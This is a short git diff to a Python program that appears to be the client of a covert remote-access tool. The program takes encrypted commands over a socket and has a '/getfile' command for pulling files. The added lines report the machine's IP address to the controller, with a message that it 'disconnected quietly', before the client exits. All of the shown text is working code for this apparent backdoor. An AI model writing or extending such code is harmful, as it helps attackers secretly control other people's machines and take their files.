@@ -35,6 +35,12 @@ while True:
     command = Fernet(key).decrypt(command).decode()
     splited_command = command.split()
     if command.lower() == "exit":
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
+        disconnected_msg = " disconnected quietly"
+        disconnected_msg = f"\n{IPAddr}{disconnected_msg}"
+        disconnected = Fernet(key).encrypt(disconnected_msg.encode())
+        s.send(disconnected)
         break
     if command == "/getfile":
         filename = s.recv(BUFFER_SIZE)
